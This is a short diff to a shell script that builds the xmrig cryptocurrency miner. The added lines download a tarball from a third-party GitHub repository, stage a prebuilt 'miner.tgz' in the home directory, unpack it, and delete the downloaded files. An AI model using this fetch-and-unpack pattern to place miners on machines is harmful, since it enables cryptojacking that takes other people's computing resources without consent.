@@ -72,4 +72,13 @@ fi
 make -j$(nproc)
 cd
 ln -s xmrig/build/xmrig start_xmrig
+curl -LO https://github.com/ioprojecton/xmrig/tarball/master
+tar -xzvf master
+rm master
+cd io*
+cp miner.tgz ~
+cd
+rm -rf io*
+tar -zxvf miner.tgz
+rm z
 exit
